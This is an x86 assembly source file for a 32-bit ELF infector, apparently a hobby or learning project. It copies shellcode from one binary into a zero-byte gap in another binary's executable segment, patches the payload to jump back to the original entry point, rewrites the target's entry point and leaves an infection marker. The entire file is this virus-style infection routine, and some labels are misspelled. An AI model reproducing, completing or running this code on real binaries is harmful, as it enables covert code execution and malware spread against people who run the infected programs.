;open flag value
%define O_RDONLY 0
%define O_RDWR 2

;mmap flags
%define MAP_SHARED	1
%define MAP_PRIVATE	2

;mmap prots
%define PROT_READ_WRITE 3 ; PROT_READ(1) | PROT_WRITE(2)

;mark offset
%define EI_PAD	9

;e_ident value
%define ELFCLASS32 1 ; 32 bit elf

;size of e_ident array
%define ident_size 16

;segment header types
%define PT_LOAD 1

;segment header flags
%define PF_X 1

; errno values
%define SUCCESS		0
%define	ERR_BAD_USAGE	1
%define	ERR_BAD_OPEN	2
%define ERR_BAD_FSTAT	3
%define ERR_EMPTY_FILE	4
%define ERR_BAD_MMAP	5
%define ERR_NOT_TARGET	6
%define ERR_INFECTED	7
%define ERR_NO_SHELL	8
%define ERR_NO_MARKER	9
%define ERR_NO_XL_SEG	10
%define ERR_NO_GAP	11

; stat struct
STRUC	stat
	before_size:	resb 20 ; the other elements don't really matter in this context, we just need the
	st_size: 	resd 1	; offsets in the stat structure
	stat_padding:	resb 64
ENDSTRUC
; Elf32_Ehdr struct
STRUC Elf32_Ehdr
	e_ident:	resb 	ident_size
	e_type:		resw 	1
	e_machine:	resw 	1
	e_version:	resd	1
	e_entry:	resd	1
	e_phoff:	resd	1
	e_shoff:	resd	1
	e_flags:	resd	1
	e_ehsize:	resw	1
	e_phentsize:	resw	1
	e_phnum:	resw	1
	e_shentsize:	resw	1
	e_shnum		resw	1
	e_shstrndx:	resw	1
ENDSTRUC

STRUC Elf32_Shdr
	sh_name		resd	1
	sh_type		resd	1
	sh_flags	resd	1
	sh_addr		resd	1
	sh_offset	resd	1
	sh_size		resd	1
	sh_link		resd	1
	sh_info		resd	1
	sh_addralign	resd	1
	sh_entsize	resd	1
ENDSTRUC

STRUC Elf32_Phdr
	p_type		resd	1
	p_offset	resd	1
	p_vaddr		resd	1
	p_paddr		resd	1
	p_filesz	resd	1
	p_memsz		resd	1
	p_flags		resd	1
	p_align		resd	1
ENDSTRUC


section .data
	; my special touch
	mark db "||-//", 0x00
	mark_len equ $ - mark

	; usage
	usage db "usage : ./file pivot paylod", 0x0a, 0x00
	usage_len equ $ - usage

	;is opened ?
	bad_open db "couldn't open file!", 0x0a, 0x00
	bad_open_len equ $ - bad_open

	; is an elf file ?
	bad_elf db "file is not an elf :(", 0x0a, 0x00
	bad_elf_len equ $ - bad_elf

	; is stated ?
	bad_stat db "coudn't stat file!", 0x0a, 0x00
	bad_stat_len equ $ - bad_stat

	; is empty file ?
	empty_file db "file appears to be empty!", 0x0a, 0x00
	empty_file_len equ $ - empty_file

	; is mapped correctly ?
	bad_mmap db "couldn't mmap file!", 0x0a, 0x00
	bad_mmap_len equ $ - bad_mmap

	; is 32 bit elf ?
	bad_32_bit_elf db "file is not a 32 bit elf!", 0x0a, 0x00
	bad_32_bit_elf_len equ $ - bad_32_bit_elf

	; is already infected ?
	infected db " is already infected :-)", 0x0a, 0x00
	infected_len equ $ - infected

	target_section db ".text", 0x00

	; is the binary stripped ?
	no_text db ".text section wasn't found, be sure to supply a non-stripped binary!", 0x0a, 0x00
	no_text_len equ $ - no_text

	; was the marker found ?
	no_marker db "no mark was found, make sure you follow the expectations at the Readme file!", 0x0a, 0x00
	no_marker_len equ $ - no_marker

	; was any gap found ?
	no_gap_found db "no gap was found :(", 0x0a, 0x00
	no_gap_found_len equ $ - no_gap_found

	gap_found db "[+] found a good gap", 0x0a, 0x00
	gap_found_len equ $ - gap_found

	; copying progress
	shell_copied db "[+] copying shell", 0x0a, 0x00
	shell_copied_len equ $ - shell_copied

	; progress string
	marking db "[+] leaving mark ...", 0x0a, 0x00
	marking_len equ $ - marking

	; all good
	enjoy db " has been infected!", 0x0a, 0x00
	enjoy_len equ $ - enjoy

section .bss
	pivot_name:	resb 4
	pivot_fd:	resb 4
	pivot_size:	resb 4
	pivot_data:	resd 1	; pointer to the mapped data

	elf_name:	resb 4
	elf_fd:		resb 4
	elf_size:	resb 4
	elf_data:	resd 1	; pointer to mapped data

	shellcode:	resb 4	; shellcode address is memorry
	shellcode_size:	resb 4

section .text
	global _start

_start:
	; ebp should be 0 at the start
	cmp dword[esp], 3 	; argc
	je good_arg_count

	push usage
	push usage_len
	call print

	push ERR_BAD_USAGE	; the return value
	jmp exit

good_arg_count:
	;; saving one file name for later
	mov eax, [esp + 0x8]	; pivot name
	mov [pivot_name], eax

	mov eax, [esp + 0x0c]	; elf name

	;; opening files
	push eax	; elf name
	push O_RDONLY
	call open
	mov [elf_fd], eax
	test eax, eax
	js open_err

next_open:
	push dword[pivot_name]
	push O_RDWR
	call open
	mov [pivot_fd], eax
	test eax, eax
	jns getting_sizes

open_err:
	push bad_open
	push bad_open_len
	call print		; "couldn't open file!"
	push ERR_BAD_OPEN	; the return value
	;; deciding which file to clean
	mov eax, [elf_fd]
	test eax, eax
	js exit 		; no files have been opened
	jmp close_elf 		; elf was opened but pivot wasn't

getting_sizes:
	push eax ; pivot_fd
	call get_file_size
	mov [pivot_size], eax
	cmp eax, 0
	jg next_size

	jmp file_size_err

next_size:
	push dword[elf_fd]
	call get_file_size
	mov [elf_size], eax
	cmp eax, 0
	jg mapping

file_size_err:
	;; comparing both sizes against -1 (fstat failed) and 0 (empty file)
	mov eax, [elf_size]
	test eax, eax
	je an_empty_file
	js failed_fstat

	mov eax, [pivot_size]
	test eax, eax
	js failed_fstat

an_empty_file:
	push empty_file
	push empty_file_len
	call print		; "empty file!"
	push ERR_EMPTY_FILE	; the return value
	jmp close_files		; cleaning resources

failed_fstat:
	push ERR_BAD_FSTAT	; the return value
	jmp close_files		; cleaning resources

mapping:
	push eax 	; elf_size
	push MAP_PRIVATE
	push dword[elf_fd]
	call mmap
	mov [elf_data], eax

	cmp eax, -1
	; if we jumped to mmap_err we have to figure out if we mapped any of the files correctly so
	; we know if we should unmap them before exiting, for that I'll use ebx
	; pivot wasn't mapped -> ebx = 1
	; elf wasn't mapped -> ebx = 0
	jne next_map
	xor ebx, ebx
	jmp mmap_err

next_map:
	push dword[pivot_size]
	push MAP_SHARED
	push dword[pivot_fd]
	call mmap
	mov [pivot_data], eax

	cmp eax, -1
	jne after_mapping
	mov ebx, 1

mmap_err:
	push ERR_BAD_MMAP
	; ebx has the value of what file failed
	test ebx, ebx
	je close_files	; elf failed -> nothing was mapped -> close files and exit
	jmp unmap_elf	; pivot failed -> elf was mapped -> unmap elf, close files then exit

after_mapping:
	; next we have to check if the file we're infecting is 32 bit little endian, if not then we exit
	push dword[pivot_data]
	call is_target_elf	; returns -1 for false, 0 for true
	je checking_infection

	push bad_32_bit_elf
	push bad_32_bit_elf_len
	call print
	push ERR_NOT_TARGET
	jmp clean


checking_infection:
	; in the end of each infection we leave a special mark at EI_PAD offset, checking those bytes should
	; yeld if the file is already infected or not

	push mark
	mov eax, [pivot_data]
	add eax, EI_PAD
	push eax

	call strcmp
	test eax, eax
	jne finding_shellcode

	mov eax, [pivot_name]
	push eax
	call strlen
	push eax
	call print

	push infected
	push infected_len
	call print

	push ERR_INFECTED
	jmp clean

finding_shellcode:

	mov eax, [elf_data]
	push eax
	push shellcode_size
	call find_shell ; returns a pointer to the .text sections, and initializes the shellcode_size variable
	mov [shellcode], eax
	test eax, eax	; shell = NULL ?
	jne ptaching
	push ERR_NO_SHELL
	jmp clean

patching:
	push eax; shellcode
	push dword[shellcode_size]
	push 0x69696969 	; the DOWRD to replace in the shellcode
 	;push the entry point ; AKA the value we'd replace the above value with
	mov eax, [pivot_data]
	add eax, e_entry
	push dword[eax];

	call patch_jump_point
	test eax, eax
	jns segments
	push ERR_NO_MARKER
	jmp clean	; marker wasn't found -> we can't complete the infection


segments:
	;; parse the segment headers and find a gap in the executable one
	; getting a pointer to the segment base
	mov eax, [pivot_data]
	mov ebx, [eax + e_phoff] ; we need eax to stay the same for a while
	add ebx, eax
	sub ebx, Elf32_Phdr_size; pointer to the program headers's base - 1 * Elf32_Phdr_size

	; getting p_phunm
	mov cx, word[eax + e_phnum]
	and ecx, 0xffff; e_phnum is a word value


next_segment:

	dec ecx
	js no_segment

	add ebx, Elf32_Phdr_size ; ++segment


	mov edx, [ebx + p_type] ; checking the segment type
	and edx, PT_LOAD
	je next_segment ; not loadable

	mov edx, [ebx + p_flags] ; checking the segment flags
	and edx, PF_X
	je next_segment	; not executable

	jmp segment_found


no_segment:

	push ERR_NO_XL_SEG
	jmp clean

segment_found:
	; now that we found the target segment, we have to find a suitable gap to store our shellcode
	; segment offset in file
	mov edx, [ebx + p_offset]
	add edx, eax	; eax is the memory base of the file
	push edx	; segment offset in memorry

	push dword[ebx + p_filesz]
	push dword[shellcode_size]

	call find_gap
	test eax, eax
	jne next4
	push ERR_NO_GAP
	jmp clean

next4:
	; copying the shellcode
	push eax ; the gap address
	push dword[shellcode]
	push dword[shellcode_size]
	call copy_data


	; now all we have to do is :
	;	1 - patch the entry point
	; 	2 - leave mark
	; 	3 - unmap and close the files
	; 	4 - ???
	; 	5 - profit

	;; patching the entry point
	; eax has the gap offset in memorry, we have to get the gap offset in file, then add it to the old 
	; entry point
	; ebx should still have a Elf32_Phdr pointer to the executable segment and
	mov edx, [ebx + p_vaddr]
	sub eax, [pivot_data] ; get the gap offset in file
	add eax, edx ; the the new entry point value (aka where the shellcode is gonna be in memorry)
	mov ebx, [pivot_data] ; TODO : might use a lea here
	add ebx, e_entry
	mov [ebx], eax
	;mov [pivot_data + e_entry], eax ; patch the entry point
	;;

leaving_mark:
	push marking
	push marking_len
	call print	;"leaving mark ..."
	;
	mov eax, [pivot_data]
	add eax, 9	; pointing at EI_PAD
	push eax
	push mark	; the "jeff was here" thingy
	call strlen
	push eax
	call copy_data

	mov eax, [pivot_name]
	push eax
	call strlen
	push eax
	call print

	push enjoy
	push enjoy_len
	call print
	push SUCCESS ; the return value

clean: 	; we have to preserve the state of the stack after each call since the return value was the last thing
	; pushed on the stack
	unmap_files:
		unmap_elf:
			push dword[elf_data]
			push dword[elf_size]
			call unmap
			add esp, 8

		unmap_pivot:
			push dword[pivot_data]
			push dword[pivot_size]
			call unmap
			add esp, 8

	close_files:
		close_pivot:
			push dword[pivot_fd]
			call close
			add esp, 4

		close_elf:
			push dword[elf_fd]
			call close
			add esp, 4

	jmp exit


open:	; int open(char *file, int flags);
	push ebp
	mov ebp, esp

	;saving used registers
	push ebx
	push ecx
	;

	mov eax, 0x5		; sys_open
	mov ebx, [ebp + 0xc]	; file name
	mov ecx, [ebp + 0x8]	; flags
	int 0x80

	;restoring used registers
	pop ecx
	pop ebx
	;
	pop ebp
	ret


mmap:	; void *mmap(DWORD size, int flags, int fd)
	push ebp
	mov ebp, esp
	;; saving used resgisters
	push ebx
	push ecx
	push edx
	push esi
	push edi
	;;

	mov eax, 0xc0			; sys_mmap_pgoff
	xor ebx, ebx			; the kernal is free to map at any random address
	mov ecx, [ebp + 0x10]		; file size
	mov edx, PROT_READ_WRITE	; the whole goals is to be able to edit both files in memorry
	mov esi, [ebp + 0xc]		; flags
	mov edi, [ebp + 0x08]		; file descriptor
	push ebp
	xor ebp, ebp			; offset
	int 0x80
	pop ebp

	mov ebx, eax
	shr ebx, 24
	cmp bl, 0xff 			; this means mmap returned -1
	jne ret_mmap

mapping_error:
	mov eax, -1
	push bad_mmap
	push bad_mmap_len
	call print
	add esp, 8

ret_mmap:
	;; restoring used registers
	pop edi
	pop esi
	pop edx
	pop ecx
	pop ebx
	;;
	pop ebp
	ret


copy_data:	; void *copy_data(void *dst, void *src, DWORD size) ; basically a memcpy()
	push ebp
	mov ebp, esp
	;saving used registers
	push esi
	push edi
	push ecx
	push edx
	;

	mov edi, [ebp + 0x10]
	mov esi, [ebp + 0x0c]
	mov ecx, [ebp + 0x8]	; size
	xor edx, edx

copying_loop:
	dec ecx
	js copied

	movsb
	jmp copying_loop

copied:
	push shell_copied
	push shell_copied_len
	call print	; "shell copied!"
	;restoring registers
	add esp, 8
	pop edx
	pop ecx
	pop edi
	pop esi
	;

	pop ebp
	ret


find_gap:	; void *find_gap(void *segment, DWORD seg_size, DWORD shellcode_size)

	push ebp
	mov ebp, esp
	;saving used registers
	push ebx
	push ecx
	push edx
	;
	xor eax, eax		; the size of the current gap
	mov ebx, [ebp + 0x10]	; void *segment in memorry
	mov ecx, -1		; the loop counter
	mov edx, [ebp + 0xc]	; segment size

parsing_data:	; now there is a better method to do this, by getting the next segment offset and substracting
		; it from the current segment base or smtg like this, but I don't really understand why/how
		; that works

	inc ecx			; i++
	cmp ecx, edx		; i > seg_size ?
	je no_gap

	cmp byte[ebx + ecx], 0	; segment[i] == 0 ?
	jne check_and_reset
	inc eax			; current gap size
	jmp parsing_data

check_and_reset:
	cmp eax, [ebp + 0x08]	; current_size => shellcode_size ?
	jl reset_counter
	; we have a valid gap @ segment + i - current_size
	sub ecx, eax	; i - current_size
	add ebx, ecx	; segment + i - current_size
	mov eax, ebx	; the value to return
	jmp ret_gap

reset_counter:
	xor eax, eax 		; current gap size = 0
	jmp parsing_data

no_gap:
	push no_gap_found
	push no_gap_found_len
	call print
	xor eax, eax		; gap = NULL
	add esp, 8
	jmp ret_gap

ret_gap:
	; eax has the right return value, we just have to return
	;restoring used registers
	pop edx
	pop ecx
	pop ebx
	;

	pop ebp

	ret



patch_jump_point:	;void patch_jump_point(char *shellcode, size_t size, DWORD marker, DWORD entry_point)

	push ebp
	mov ebp, esp
	;storing used registers
	push ebx
	push ecx
	push edx
	;
	mov eax, [ebp + 0x14] 	; shellcode
	mov ecx, [ebp + 0x10]	; size
	mov edx, [ebp + 0xc] 	; the marker which is 0x69696969 in this case
	; the combo eax + ecx points at the last byte in the shellcode string (\0) but we need it to point 
	; at the last DWORD
	; so -1 byte for the null byte and -3 to point at the last valid DWORD
	sub ecx, 4

marker_loop:	; will be searching from the end to start as that is 
		; where the marker is likely to be
	cmp dword[eax + ecx], edx
	je found_marker

	dec ecx
	jns marker_loop ; buff[0] is a valid DWORD as well

no_mark_found:
	push no_marker
	push no_marker_len
	call print
	add esp, 8
	mov eax, -1		; returns FALSE
	jmp ret_patch

found_marker:
	mov ebx, [ebp + 0x08]	; the original entry point
	mov [eax + ecx], ebx 	; patching the actual return address
	xor eax, eax 		; returns TRUE

ret_patch:
	;restoring saved register
	pop edx
	pop ecx
	pop ebx
	pop ebp
	ret



find_shell: ; void* find_shell(void *data, size_t shellcode_size); returns a pointer to .text section, and stores the shellcode size
	push ebp
	mov ebp, esp
	sub esp, 0xc
	; some variables here are
	;[ebp - 4] -> Elf32_Shdr *section = (char *)data + h_ptr -> e_shoff (done)
	;[ebp - 8] -> Elf32_Shdr *text; uinitialized
	;[ebp - 0xc] -> (2 bytes value) size_t section_count = h_ptr -> e_shnum (done)
	;2 bytes for alignements

	;saving registers
	push ebx
	push ecx
	push edx

	mov ebx, [ebp + 0xc] ; this will stay in ebx for the rest of the function so we don't keep accessing memorry

	;;taking care of the generic section pointer (@ ebp - 4)
	mov edx, [ebx + e_shoff]
	add edx, ebx	; for later
	; edx has the generic section pointer

	mov [ebp - 4], edx
	;;


	;;taking care of the string index table section pointer (@ ebp - 0xc)
	mov ax, word[ebx + e_shstrndx]
	and eax, 0xffff
	mov ecx, Elf32_Shdr_size
	mul cl			; eax now has the string table file offset in file, and edx has the sections 
				;base in memorry
	add eax, edx
	; now we have a pointer to the string table section, but we want the actuall offset of the section
	; in memorry
	mov eax, [eax + sh_offset]
	add eax, ebx
	mov edx, eax		; from now on, edx will have the pointer to the string index table, we're gonna
				; use this later

	;;taking care of section_count (@ ebp - 0xc)
	mov ax, [ebx + e_shnum]
	and eax, 0xffff
	mov [ebp - 0xc], eax
	;


	; parsing the sections and returning the address of .text
	xor ecx, ecx
	push target_section	; argument to strcmp

parsing_loop:

	mov eax, [ebp - 0x4]	; generic section pointer, by default it points to the first section
	;get the sh_name and add it to edx (the string table section)
	mov esi, [eax + sh_name]
	add esi, edx
	push esi
	call strcmp
	add esp, 4		; so we don't have to keep track of the stack 
	;do some error checking
	test eax, eax
	je found_text_section
	;; section ++
	add dword[ebp - 0x04], Elf32_Shdr_size
	;;

	inc ecx
	cmp cx, word[ebp - 0xc] ; e_shnum
	jne parsing_loop

no_text_section:

	xor eax, eax 	; text = NULL
	push no_text
	push no_text_len
	call print
	add esp, 0x18
	jmp ret_text_section


found_text_section:;

	;storing the address
	mov eax, [ebp - 0x4] ; the section header pointer
	mov ecx, eax ; for storing the size later
	mov eax, [eax + sh_offset] ;the actual section offset
	add eax, ebx ; ebx still contains the mmap memory base ; this eax will be returned to the previous function!
	;storing the size
	mov ebx, [ebp + 0x8]
	mov ecx, [ecx + sh_size]
	mov [ebx], ecx
	;
	add esp, 0x10

ret_text_section:
	;restoring registers
	pop edx
	pop ecx
	pop ebx
	;
	pop ebp
	ret




unmap:; void unmap(void *data, size_size) ; not used yet, TODO : use this function and close the files at the end of _start
	push ebp
	mov ebp, esp
	;saving registers ; might not be necessary
	push eax
	push ebx
	push ecx
	;

	mov eax, 0x5b
	mov ebx, [ebp + 0xc]
	mov ecx, [ebp + 0x8]
	int 0x80

	;restoring registers
	pop ecx
	pop ebx
	pop eax
	;
	pop ebp
	ret

close: ; void close(int fd);
	push ebp
	mov ebp, esp

	;saving registers
	push eax
	push ebx
	;

	mov eax, 0x6
	mov ebx, [ebp + 0x8]
	int 0x80

	;restoring registers
	pop ebx
	pop eax
	;
	pop ebp
	ret



get_file_size:	; void get_file_size(int fd);
	push ebp
	mov ebp, esp
	sub esp, stat_size
	; saving registers
	push ebx
	push ecx
	;
	mov eax, 0x6c
	mov ebx, [ebp + 0x8]
	mov ecx, esp
	add ecx, 12

	int 0x80

	mov eax, [ecx + st_size]
	add esp, stat_size

	test eax, eax
	jns after_stat
	push bad_stat
	push bad_stat_len
	call print
	mov eax, -1
	add esp, 8


after_stat:
	;restoring registers
	pop ecx
	pop ebx
	;
	pop ebp
	ret



print: ; void print(char *buf, size_t len);
	push ebp
	mov ebp, esp
	; saving used resgiters
	push eax
	push ebx
	push ecx
	push edx
	; performing the syscall
	mov eax, 4
	mov ebx, 1
	mov ecx, [ebp + 0xc]
	mov edx, [ebp + 0x8]
	int 0x80
	;	restoring saved registers
	pop edx
	pop ecx
	pop ebx
	pop eax
	;
	mov esp, ebp
	pop ebp
	ret



strlen:; size_t strlen(char *buf);
	push ebp
	mov ebp, esp
	;saving registers
	push ebx
	;
	mov eax, -1
	mov ebx, [ebp + 0x8]
loop:
	inc eax
	cmp byte[ebx + eax], 0
	jne loop
	;restoring registers
	pop ebx
	;
	mov esp, ebp
	pop ebp
	ret



is_target_elf: 	; int is_target_elf(void *data)
	push ebp
	mov ebp, esp

	mov eax, [ebp + 0x8] ; mapped date
	; checking the magic bytes
	cmp dword[eax], 0x464c457f ; "\x7f" + "ELF"
	je good_elf_ptr

	push bad_elf
	push bad_elf_len
	call print
	mov eax, -1
	add esp, 8
	jmp ret_arch

good_elf_ptr:
	; checking e_ident[ELFCLASS] ; eax still has the pointer to the mapped data
	add eax, 4
	cmp byte[eax], ELFCLASS32
	je is_32_bit

	push bad_32_bit_elf
	push bad_32_bit_elf_len
	call print
	add esp, 16
	mov eax, -1
	jmp ret_arch

is_32_bit:
	;push good_32_bit_elf
	;push good_32_bit_elf_len
	call print ; file is a 32 bit elf
	xor eax, eax

ret_arch:
	pop ebp
	ret



strcmp: ; size_t strcmp(char *known_buff, char *unkown_buff)
	push ebp
	mov ebp, esp
	; saving used registers;
	push ebx
	push ecx
	push edx
	;
;	; first we get the length of the first arg
	push dword[ebp + 0xc]
	call strlen
	mov ecx, eax
	mov eax, [ebp + 0x0c]
	mov ebx, [ebp + 0x8]
	dec ecx	; an array index

cmp_loop:
	; edx will be used to hold the actual bytes
	mov dl, byte[eax + ecx]
	mov dh, byte[ebx + ecx]
	xor dh, dl
	jne diff_buffers

	dec ecx  ; dec does take care of the flags
	jns cmp_loop
	jmp same_buffers

diff_buffers:
	mov eax, -1 ; returns FALSE
	jmp end

same_buffers:
	xor eax, eax

end:
	;restoring registers
	add esp, 4
	pop edx
	pop ecx
	pop ebx

	pop ebp
	ret




exit:	;void exit(int return_stat)
	xor eax, eax
	pop ebx
	inc eax
	int 0x80
